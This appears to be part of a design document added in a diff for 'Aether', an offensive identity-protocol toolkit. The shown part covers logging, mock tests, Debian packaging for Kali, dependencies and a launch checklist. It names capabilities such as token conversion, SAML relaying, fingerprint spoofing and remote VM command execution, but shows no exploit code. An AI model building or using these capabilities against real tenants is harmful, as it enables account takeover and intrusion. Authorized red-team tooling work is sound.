+        return nil, err
+    }
+    
+    // Wrap with redaction for sensitive fields
+    return &RedactLogger{logger: logger}, nil
+}
+
+// RedactLogger wraps zap.Logger to redact sensitive data
+type RedactLogger struct {
+    logger *zap.Logger
+}
+
+func (r *RedactLogger) redact(fields ...zap.Field) []zap.Field {
+    // Redact tokens, passwords, etc.
+    for i, field := range fields {
+        if field.Key == "token" || field.Key == "password" || field.Key == "secret" {
+            fields[i] = zap.String(field.Key, "[REDACTED]")
+        }
+    }
+    return fields
+}
+```
+
+---
+
+## 7. Testing Strategy
+
+### 7.1 Unit Tests (Mock Everything)
+
+```go
+// test/mock/http_mock.go
+
+package mock
+
+import (
+    "net/http"
+    "net/http/httptest"
+)
+
+// MockEntraIDServer simulates Entra ID token endpoints
+func MockEntraIDServer() *httptest.Server {
+    return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        switch r.URL.Path {
+        case "/oauth2/v2.0/token":
+            w.Write([]byte(`{
+                "access_token": "mock_access_token",
+                "refresh_token": "mock_refresh_token",
+                "expires_in": 3600
+            }`))
+        default:
+            w.WriteHeader(404)
+        }
+    }))
+}
+```
+
+### 7.2 Integration Tests (Sandbox Environment)
+
+```bash
+# test/integration/run.sh
+#!/bin/bash
+# Requires: Azure subscription with test tenant
+
+# Set up test environment
+export AETHER_TEST_TENANT="test-tenant.onmicrosoft.com"
+export AETHER_TEST_CLIENT_ID="xxxxx"
+export AETHER_TEST_USER="testuser@test-tenant.onmicrosoft.com"
+
+# Run integration tests
+go test -tags=integration ./test/integration/...
+```
+
+### 7.3 Test Coverage Goals
+
+| Component | Target Coverage |
+|-----------|-----------------|
+| Protocol parsers | 90%+ |
+| Token engines | 85%+ |
+| CAP evaluator | 80%+ |
+| Exec engines | 70%+ (requires cloud access) |
+| CLI | 80%+ |
+
+---
+
+## 8. Packaging for Kali Linux
+
+### 8.1 Debian Directory Structure
+
+```
+debian/
+├── control
+├── rules
+├── copyright
+├── changelog
+├── compat
+├── install
+├── manpages
+└── source/
+    └── format
+```
+
+### 8.2 `debian/control`
+
+```
+Source: aether
+Section: net
+Priority: optional
+Maintainer: Your Name <youremail@example.com>
+Build-Depends: debhelper (>= 12), golang-go (>= 1.22)
+Standards-Version: 4.6.0
+Homepage: https://github.com/yourusername/aether
+Vcs-Browser: https://github.com/yourusername/aether
+Vcs-Git: https://github.com/yourusername/aether.git
+
+Package: aether
+Architecture: amd64 arm64
+Depends: ${misc:Depends}
+Description: Modern Identity Protocol Exploitation Toolkit
+ Aether is a low-level protocol exploitation toolkit for modern
+ identity fabrics. It provides PRT→OAuth conversion, WS-Trust/SAML
+ relaying, Conditional Access policy evaluation, and cloud VM
+ command execution — all from a single static binary.
+ .
+ It is designed for authorized penetration testing and red team
+ operations against hybrid cloud environments.
+```
+
+### 8.3 `debian/rules`
+
+```makefile
+#!/usr/bin/make -f
+
+export GO111MODULE=on
+export GOPROXY=https://proxy.golang.org
+
+%:
+    dh $@
+
+override_dh_auto_build:
+    cd $(CURDIR) && go build -ldflags="-s -w" -o aether ./cmd/aether
+
+override_dh_auto_install:
+    mkdir -p $(CURDIR)/debian/aether/usr/bin
+    cp $(CURDIR)/aether $(CURDIR)/debian/aether/usr/bin/
+    mkdir -p $(CURDIR)/debian/aether/usr/share/doc/aether
+    cp $(CURDIR)/README.md $(CURDIR)/debian/aether/usr/share/doc/aether/
+```
+
+### 8.4 Build Command
+
+```bash
+# Build the .deb package
+dpkg-buildpackage -us -uc -b
+
+# Result: ../aether_1.0.0_amd64.deb
+```
+
+---
+
+## 9. Appendix: Dependency Map
+
+### 9.1 Core Dependencies
+
+| Dependency | Purpose | Version |
+|------------|---------|---------|
+| `github.com/spf13/cobra` | CLI framework | v1.8.0 |
+| `github.com/spf13/viper` | Config management | v1.18.0 |
+| `go.uber.org/zap` | Structured logging | v1.26.0 |
+| `go.etcd.io/bbolt` | Embedded KV store | v1.3.8 |
+| `github.com/refraction-networking/utls` | TLS fingerprint spoofing | v1.6.0 |
+| `golang.org/x/oauth2` | OAuth2 client | v0.20.0 |
+| `github.com/golang-jwt/jwt/v5` | JWT parsing | v5.2.0 |
+
+### 9.2 Cloud Provider Dependencies
+
+| Dependency | Purpose | Version |
+|------------|---------|---------|
+| `github.com/AzureAD/microsoft-authentication-library-for-go` | MSAL | v1.2.0 |
+| `github.com/Azure/azure-sdk-for-go/sdk/azidentity` | Azure auth | v1.5.0 |
+| `github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/compute/armcompute` | Azure VM管理 | v1.4.0 |
+| `github.com/aws/aws-sdk-go-v2/service/ssm` | AWS SSM | v1.44.0 |
+| `github.com/microsoftgraph/msgraph-sdk-go` | MS Graph API | v1.0.0 |
+
+### 9.3 Protocol Dependencies
+
+| Dependency | Purpose | Version |
+|------------|---------|---------|
+| `github.com/rcastillo-se/signedxml` | XML signing (SAML) | v1.0.0 |
+| `encoding/xml` | XML parsing | stdlib |
+| `encoding/asn1` | ASN.1 parsing | stdlib |
+| `crypto/rsa` | RSA operations | stdlib |
+| `crypto/x509` | Certificate handling | stdlib |
+
+---
+
+## Final Checklist for v1.0.0 Launch
+
+- [ ] All 5 modules (`prt`, `relay`, `cap`, `exec`, `validate`) functional
+- [ ] uTLS transport with Chrome/Edge/Firefox presets
+- [ ] PRT → OAuth conversion working against Entra ID
+- [ ] WS-Trust/SAML relay functional
+- [ ] Conditional Access policy parsing & offline evaluation
+- [ ] Azure VM RunCommand execution
+- [ ] BloodHound JSON path validation
+- [ ] Unit test coverage >80%
+- [ ] Integration tests against sandbox
+- [ ] Debian package built and tested
+- [ ] Man pages and `--help` complete
+- [ ] GitHub Release with signed binaries
+- [ ] Kali submission ready
+
+**Go build this. The community is waiting.** 🚀
